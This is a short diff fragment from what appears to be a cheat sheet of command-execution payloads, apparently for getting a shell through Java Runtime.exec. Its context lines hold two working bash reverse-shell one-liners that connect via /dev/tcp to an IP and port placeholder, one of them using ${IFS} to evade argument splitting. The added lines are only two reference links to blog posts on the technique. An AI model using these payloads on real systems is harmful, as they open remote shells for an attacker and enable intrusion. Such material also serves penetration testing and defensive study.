@@ -10,3 +10,6 @@ bash -c bash${IFS}-i${IFS}>&/dev/tcp/**IP**/**PORT**<&1
 #### Method3:
 bash -c $@|bash 0 echo bash -i >& /dev/tcp/**IP**/**PORT** 0>&1
 
+### Reference:
+http://www.jackson-t.ca/runtime-exec-payloads.html
+https://blog.spoock.com/2018/11/25/getshell-bypass-exec/
